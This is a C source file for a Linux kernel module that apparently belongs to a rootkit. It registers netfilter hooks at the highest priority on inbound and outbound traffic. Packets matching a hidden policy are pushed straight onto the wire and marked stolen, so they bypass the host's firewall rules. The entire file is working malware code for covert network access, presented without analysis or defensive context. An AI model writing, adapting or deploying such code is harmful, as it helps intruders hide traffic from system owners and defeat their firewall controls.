#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include "fw_bypass.h"
#include "../policy.h"
#include "../utils.h"
#include "../config.h"

static unsigned int rooti_netfilter_hook(void *priv, struct sk_buff *skb, 
                                         const struct nf_hook_state *state)
{
    enum rooti_net_rule_action action;
    bool matched = rooti_match_packet(skb, &ROOTI_FW_POLICY, &action);

    switch (action) {
    case ROOTI_PACKET_DROP:
        return NF_DROP;
    case ROOTI_PACKET_ACCEPT:
        if (matched) {
            // Forcefully send the packet out to the wire / to the user
            state->okfn(state->net, state->sk, skb);
            return NF_STOLEN;
        }
        return NF_ACCEPT;
    default:
        BUG();
    }
}

static struct nf_hook_ops rooti_inbound_nf_hook = {
    .hook = rooti_netfilter_hook,
    .hooknum = NF_INET_LOCAL_IN,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST
};

static struct nf_hook_ops rooti_outbound_nf_hook = {
    .hook = rooti_netfilter_hook,
    .hooknum = NF_INET_LOCAL_OUT,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST
};

int rooti_install_fw_bypass_hooks()
{
    int err;

    err = nf_register_net_hook(&init_net, &rooti_inbound_nf_hook);
    if (err) {
        ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
        return err;
    }

    err = nf_register_net_hook(&init_net, &rooti_outbound_nf_hook);
    if (err) {
        ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
        return err;
    }

    return 0;
}

void rooti_uninstall_fw_bypass_hooks()
{
    nf_unregister_net_hook(&init_net, &rooti_inbound_nf_hook);
    nf_unregister_net_hook(&init_net, &rooti_outbound_nf_hook);
}